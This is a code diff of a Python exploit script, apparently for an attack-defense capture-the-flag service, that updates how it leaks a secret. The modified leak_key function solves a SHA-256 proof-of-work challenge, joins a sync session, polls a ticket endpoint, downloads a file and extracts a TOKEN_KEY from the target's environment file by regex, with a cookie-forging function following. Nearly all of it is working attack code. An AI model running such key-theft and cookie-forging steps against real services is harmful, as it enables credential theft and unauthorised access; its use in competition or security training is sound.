@@ -1,7 +1,9 @@
+import hashlib
 import os
 import sys
 import tempfile
 import urllib.parse
+from time import sleep
 
 import msgpack
 import checklib
@@ -13,6 +15,13 @@ import subprocess
 regex = re.compile(r"TOKEN_KEY=([A-Za-z0-9\+=\\\/]+)")
 
 IP = sys.argv[1]
+
+
+def mine_answer(challenge):
+    for x in range(0, 10000000000000):
+        x = str(x).zfill(4)
+        if hashlib.sha256((challenge + x).encode()).hexdigest().startswith('00000'):
+            return x
 
 
 def extract_text(file_resp) -> bytes:
@@ -49,16 +58,28 @@ def leak_key():
     resp = s.post(f'http://{IP}:8000/api/sync', json=sync_data)
     data = resp.json()
     sync_id = data['id']
-    resp = requests.post('http://{}:8000/api/sync/{}/join'.format(IP, sync_id),
-                         json={'nickname': 'asd'})
-    url = f'http://{IP}:8000{resp.json()["ticket_url"]}'
-    resp = requests.get(url)
+    r = s.get(f'http://{IP}:8000/api/sync/{sync_id}/challenge')
+    challenge = r.json().get('challenge')
+    resp = s.post('http://{}:8000/api/sync/{}/join'.format(IP, sync_id),
+                         json={'nickname': 'asd', 'challenge_answer': mine_answer(challenge)})
+    public_id = resp.json().get('public_id')
+    for _ in range(20):
+        sleep(0.5)
+        r = s.get(f'http://{IP}:8000/api/ticket/' + public_id)
+        ticket_data = r.json()
+        ticket_url = ticket_data.get('ticket_url')
+        if ticket_url:
+            url = f'http://{IP}:8000{ticket_url}'
+            resp = s.get(url)
 
-    env_file_data = extract_text(resp).decode('utf-8', 'ignore')
-    matches = regex.findall(env_file_data)
-    if len(matches) == 0:
+            env_file_data = extract_text(resp).decode('utf-8', 'ignore')
+            matches = regex.findall(env_file_data)
+            if len(matches) == 0:
+                return None
+            return matches[0]
+    else:
+        print("Failed to leak key. Timeout", flush=True)
         return None
-    return matches[0]
 
 
 def generate_cookie(user_id, key=''):
